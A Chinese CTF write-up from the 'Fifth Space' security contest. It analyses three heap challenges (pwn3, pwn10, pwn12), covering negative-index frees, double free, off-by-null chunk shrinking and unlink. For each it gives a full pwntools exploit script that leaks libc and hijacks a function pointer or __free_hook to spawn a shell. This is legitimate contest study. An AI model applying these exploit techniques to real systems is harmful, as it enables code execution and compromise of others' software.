---
title: 第五空间安全大赛
categories: 
- 第五空间安全大赛
---
# 第五空间安全大赛

## 前言

比赛给了5道web，15道pwn，队里师傅做的很快，自己做了1之后看了3 10 和 12，12的chunk shrink大概是第一次做到这种题，记录一下通用的思路

## pwn3

### 前言

这道题的漏洞看到了，但是因为自己想当然的问题没有搞出来，记录一下做题的思路

### 漏洞分析

程序有Create、Delete、Show三个功能，每次固定分配0x14大小的chunk。注意bss里有个pFunc函数指针会被调用，其调用条件可以查看其引用，在while循环的最后判断choice!=3或4即会跳转到这里，我们的目标就定为覆盖这个函数指针为one_gadget地址。

```c=
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int choice; // [rsp+Ch] [rbp-14h]
  char buf; // [rsp+10h] [rbp-10h]
  char v6; // [rsp+11h] [rbp-Fh]
  unsigned __int64 v7; // [rsp+18h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  cnt[0] = -1;
  for ( pFunc = (__int64 (__fastcall *)(_QWORD, _QWORD))finish; ; pFunc(&buf, &buf) )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            menu();
            read(0, &buf, 2uLL);
            v6 = 0;
            choice = atoi(&buf);
            if ( choice )
              break;
            write(1, "Invalid select.\n", 0xFuLL);
          }
          if ( choice != 2 )
            break;
          show_chunk();
        }
        if ( choice > 2 )
          break;
        if ( choice != 1 )
          goto LABEL_15;
        create_chunk();
      }
      if ( choice != 3 )
        break;
      free_chunk();
    }
    if ( choice == 4 )
      break;
LABEL_15:
    ;
  }
  write(1, "bye~\n", 5uLL);
  return 0;
}
```

一个漏洞是free的时候是从后往前覆盖，当add 0x30个堆块时，Free(index)会造成bss存在两个相同的堆地址。

另一个漏洞存在于free的时候可以输入负数的index，我当时尝试-2、-3之类的不好使就放弃了，后来才注意到这里用的不是atoi而是自己实现的转换函数my_to_num，识别的ascii为0-9，不包含'-'，因此应该直接输入0xffffffff-1的十进制表示，而Free(0)是不会报错的，我们可以Free cnt前面的地址，从而让pFunc覆盖cnt为一个很大的数字，这样输入index可以绕过检查，造成double free。
```c
ssize_t free_chunk()
{
  ssize_t index; // rax
  signed int i; // [rsp+8h] [rbp-8h]
  signed int index1; // [rsp+Ch] [rbp-4h]

  write(1, "id: ", 4uLL);
  index = read_int();
  index1 = index;
  if ( (_DWORD)index != -1 )
  {
    if ( (signed int)index <= cnt[0] )          // 负数
    {
      free((void *)list[(signed int)index]);
      --cnt[0];
      for ( i = index1; i <= 0x2E; ++i )
        list[i] = list[i + 1];                  // ?
      index = write(1, "dele successfully\n", 0x14uLL);
    }
    else
    {
      index = write(1, "out of range.\n", 0x14uLL);
    }
  }
  return index;
}
```

同理Show可以输入负数泄露list之前的数据，这里很巧妙的是list[-19]处存在一个Libc地址，地址里的值为程序加载基地址，Show即可泄露出来

堆地址其实不必泄露，但是有了UAF也很简单

libc地址的泄露需要我们在bss上构造一个函数的got表地址，因为我们的chunk大小都是0x21，我们通过free将cnt[0]减为0x21，构造fake chunk，即可覆写bss地址，从而泄露libc

再来一次double free，覆写pFunc为one_gadget即可


### 17.py

```py
#coding=utf-8
from pwn import *
import commands
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./hard2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    p = process('./hard2')
else:
    p = remote('111.33.164.4',50010)

def Create(content):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('content: ')
    p.sendline(content)

def Show(index):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('id: ')
    p.sendline(str(index))

def Free(index):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('id: ')
    p.sendline(str(index))

def exp():
    #show proc base
    Show(str(0xffffffff-18))
    p.recvuntil('context: ')
    proc_base = u64(p.recv(6).ljust(8,'\x00'))
    log.success('proc base => ' + hex(proc_base))
    # add
    for i in range(0x30):
        Create(p64(0)+p64(0x21))
    for i in range(0xd):
        Free(0)#fake size 0x21

    #overwrite cnt
    Free(0xffffffff-4)
    #double free
    Free(0x2e)
    Show(0x2e)

    #leak heap
    p.recvuntil('context: ')
    heap_base = u64(p.recv(6).ljust(8,'\x00')) - 0x180
    log.success('heap base => ' + hex(heap_base))
    #leak libc
    Free(0)
    Free(0x2e)
    Free(0xffffffff-5)#to add more

    Create(p64(proc_base+0x202068))
    Create('a'*4)
    Create('a'*4)

    Create(p64(proc_base+elf.got['free'])+p64(0x21))
    Show(0xffffffff-4)

    p.recvuntil('context: ')
    libc_base = u64(p.recv(6).ljust(8,'\x00')) - libc.symbols['free']
    log.success('libc base => ' + hex(libc_base))
    #get shell
    for i in range(4):
        Free(0)
    Create(p64(proc_base+0x202078))
    Create('a'*8)
    Create('a'*8)

    #Create(p64(libc_base+libc.symbols['system']))
    Create(p64(libc_base+gadgets[0]))
    gdb.attach(p)
    p.recvuntil('> ')
    p.sendline('5')
    p.interactive()

exp()
```

## pwn10

### 前言

这个题比较巧妙，程序的Add会添加一个node一个chunk，node里放chunk，分配大小固定为0x20。

```c
unsigned __int64 Add()
{
  int size; // ST0C_4
  signed int i; // [rsp+8h] [rbp-28h]
  _QWORD *node_chunk; // [rsp+10h] [rbp-20h]
  char *content_chunk; // [rsp+18h] [rbp-18h]
  char buf; // [rsp+20h] [rbp-10h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  for ( i = 0; i < 4; ++i )
  {
    if ( !qword_6020E0[i] )
    {
      node_chunk = malloc(0x20uLL);
      content_chunk = (char *)malloc(0x20uLL);
      if ( !node_chunk || !content_chunk )
      {
        puts("Error occured!!!");
        exit(2);
      }
      *node_chunk = content_chunk;
      puts("Give me your size : ");
      read(0, &buf, 8uLL);
      size = atoi(&buf);
      puts("Now give me your content");
      get_input(content_chunk, size);
      qword_6020E0[i] = (__int64)node_chunk;
      puts("Success");
      break;
    }
  }
  if ( i == 4 )
    puts("Th3 1ist is fu11");
  return __readfsqword(0x28u) ^ v6;
}
```

漏洞存在于Edit，可以edit的次数是三次，第一次Edit，程序会把index处的node里的chunk地址写在0x602100处，第二次Edit就会输入这个chunk里的值。如果我们Add几个chunk，Edit其中一个，则0x602100会有其chunk地址，释放其中一个，则node和chunk进入fastbins[0x30]，我们再去编辑chunk，可以malloc到我们设计的地方，这里我们修改低字节为'\x60'，为chunk1 node的堆地址。free的顺序是node->chunk，Add的顺序是一样的，因此第二次Add的node为第一次的chunk，第二次的chunk为fake chunk，即node1，我们修改chunk2内容，即修改了node1的chunk1_addr。

之后show(1)即可泄露地址，注意这里只能泄露俩字节，需要爆破0xff，但是有意思的是a64l这个函数的前几位和system一样的，只有后面俩字节不一样，因此可以通过它泄露后两个字节，进而Edit其为system地址，输入choice的时候输入/bin/sh即可拿到shell。

```c
unsigned __int64 __fastcall Edit(_DWORD *edit_num)
{
  int size; // ST18_4
  int size_1; // ST18_4
  int v3; // ST1C_4
  unsigned int index; // [rsp+14h] [rbp-1Ch]
  char buf; // [rsp+20h] [rbp-10h]
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  if ( qword_602100 && edit_num )
  {
    puts("Give me your size : ");
    read(0, &buf, 8uLL);
    size = atoi(&buf);
    puts("Now give me your content");
    get_input((char *)qword_602100, size);
    printf("edit_time:%d\n", (unsigned int)--*edit_num);
    qword_602100 = 0LL;
  }
  else
  {
    puts("Give me your index : ");
    read(0, &buf, 8uLL);
    index = atoi(&buf);
    if ( index > 3 )
    {
      puts("Out of list");
    }
    else if ( qword_6020E0[index] && *edit_num )
    {
      puts("Give me your size : ");
      read(0, &buf, 8uLL);
      size_1 = atoi(&buf);
      puts("Now give me your content");
      v3 = get_input(*(char **)qword_6020E0[index], size_1);
      qword_602100 = *(_QWORD *)qword_6020E0[index];
      printf("edit_time:%d\n", (unsigned int)--*edit_num);
      if ( !v3 )
        puts("nothing");
    }
    else
    {
      puts("invalid");
    }
  }
  return __readfsqword(0x28u) ^ v7;

}
```
### exp.py

```py
#coding=utf-8
from pwn import *
import commands
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./pwn10')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
gadgets = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
if debug:
    p = process('./pwn10')
else:
    p = remote('111.33.164.4',50010)

def Add(size,content):
    p.recvuntil('Give me your choice :')
    p.sendline('1')
    p.recvuntil('size :')
    p.sendline(str(size))
    p.recvuntil('content')
    p.send(content)

def Show(index):
    p.recvuntil('Give me your choice :')
    p.sendline('2')
    p.recvuntil('index :')
    p.sendline(str(index))

def Edit(index,size,content):
    p.recvuntil('Give me your choice :')
    p.sendline('3')
    p.recvuntil('index :')
    p.sendline(str(index))
    p.recvuntil('size :')
    p.sendline(str(size))
    p.recvuntil('content')
    p.send(content)

def Edit1(size,content):
    p.recvuntil('Give me your choice :')
    p.sendline('3')
    p.recvuntil('size :')
    p.sendline(str(size))
    p.recvuntil('content')
    p.send(content)

def Delete(index):
    p.recvuntil('Give me your choice :')
    p.sendline('4')
    p.recvuntil('index :')
    p.sendline(str(index))

def exp():
    Add(0x10,'a'*0x10)#0
    Add(0x10,'a'*0x10)#1
    Add(0x8,'/bin/sh\x00')#2
    Edit(0,0x10,'b'*0x10)
    Delete(0)

    Edit1(1,'\x60')

    Add(0x8,p64(elf.got['a64l']))#0
    Show(1)
    p.recvuntil('\x20\n')
    atol_addr = u16(p.recv(2))
    system_addr = atol_addr - libc.symbols['a64l'] + libc.symbols['system']
    log.success('system addr => ' + hex(system_addr))
    Edit(1,2,p32(system_addr)[:2])
    #gdb.attach(p)
    p.recvuntil("choice :")
    p.sendline("/bin/sh\x00")
    p.interactive()

exp()
```

## pwn12

### 前言

pwn12是一道很典型的chunk shrink题目，似乎是第一次做到类似的题目，非常有必要整理做题的套路。

### 前言

这道题上来就mallopt禁止了fastbin，让我想起来RCTF那道难到吐血的large bin attack的题目，到最后也没什么好思路，最后照着17师傅的exp做了一遍，是非常典型的chunk shrink题目emm。

### 程序逻辑

程序有Add、Edit、Show、Delete，只能分配0x78及以下的chunk。Edit有off-by-null，由于不能分配0xf0的chunk，不能构造chunk extend。这里使用shrink来构造Overlap chunk。又因为没开PIE，最后可以unlink。

chunk shrink构造：
chunk0(0x80)#0 
chunk1(0x80)#1  
chunk2(0x80)#2  
chunk3(0x80)#3  
chunk4(0x80)#4  
chunk4(0x80)#5  
Free掉1-3，Edit(0)通过off-by-one修改chunk1的size为0x100，注意我们Free这三个堆块之后，chunk4的prev_size是0x180。

Malloc(0x78)*2，我们会分配到chunk1和chunk2。Free(1)和Free(4)，Free(1)的时候1和2不会合并，而Free(4)的时候由于chunk4的prev_size为0x180，因此其寻找上一个chunk会找到chunk1，因为我们释放了chunk1，所以chunk2的prev_in_use为0，chunk1-chunk4合并，重新分配，造成chunk2的ovelapping。

### exp.py

```py
#coding=utf-8
from pwn import *
import commands
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./pwn12')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
gadgets = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
if debug:
    p = process('./pwn12')
else:
    p = remote('111.33.164.4',50012)

def Add(size):
    p.recvuntil('Exit')
    p.sendline('1')
    p.recvuntil('Size?')
    p.sendline(str(size))

def Edit(index,content):
    p.recvuntil('Exit')
    p.sendline('2')
    p.recvuntil('Index?')
    p.sendline(str(index))
    p.recvuntil(':\n')
    p.send(content)

def Show(index):
    p.recvuntil('Exit')
    p.sendline('3')
    p.recvuntil('Index?')
    p.sendline(str(index))

def Delete(index):
    p.recvuntil('Exit')
    p.sendline('4')
    p.recvuntil('Index?')
    p.sendline(str(index))

def exp():
    #init
    p.recvuntil("what's your name?\n")
    p.send('a'*0x20)
    p.recvuntil("what's your info?\n")
    p.send('a'*0x200)
    Add(0x78)#0
    Add(0x78)#1
    Delete(0)
    Add(0x78)#0
    #leak libc
    Show(0)
    p.recvline()
    libc_offset = 0x3c4b20
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 88 - libc_offset
    libc.address = libc_base
    log.success('libc base => ' + hex(libc_base))
    #get shell
    Delete(1)
    Delete(0)
    #0-7
    for i in range(8):
        Add(0x78)

    Delete(3)
    Delete(4)
    Delete(5)
    Edit(2,'\x00'*0x78)

    Add(0x78)#3
    Add(0x78)#4


    Delete(3)
    Delete(6)


    Add(0x78)#3
    Add(0x78)#5
    Add(0x78)#6
    Add(0x78)#8

    # 4 == 5

    Delete(1)
    Delete(4)
    Delete(6)

    #leak heap
    Show(5)
    heap_addr = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0x80
    log.success('heap addr => ' + hex(heap_addr))

    #get shell
    Add(0x78)#1
    Add(0x78)#4
    Add(0x78)#6
    Add(0x78)#9


    # 4 == 5
    Delete(3)
    Delete(4)
    Delete(6)

    Add(0x28)#3
    Add(0x78)#4
    bss_addr = 0x602310
    #unlink
    Edit(3,p64(0)+p64(0x20)+p64(bss_addr-0x18)+p64(bss_addr-0x10)+p32(0x20))
    Edit(4,'\x00'*0x40+p64(0x70)+p64(0x30))


    Delete(5)
    Edit(3,p32(0)+p32(0x78)+p64(libc.symbols['__free_hook'])+p32(0x1)+p32(0x78)+p32(0x6022f8))
    Edit(2,p64(libc.symbols['system']))
    Edit(0,'/bin/sh\x00')
    gdb.attach(p)
    Delete(0)

    p.interactive()

exp()
```
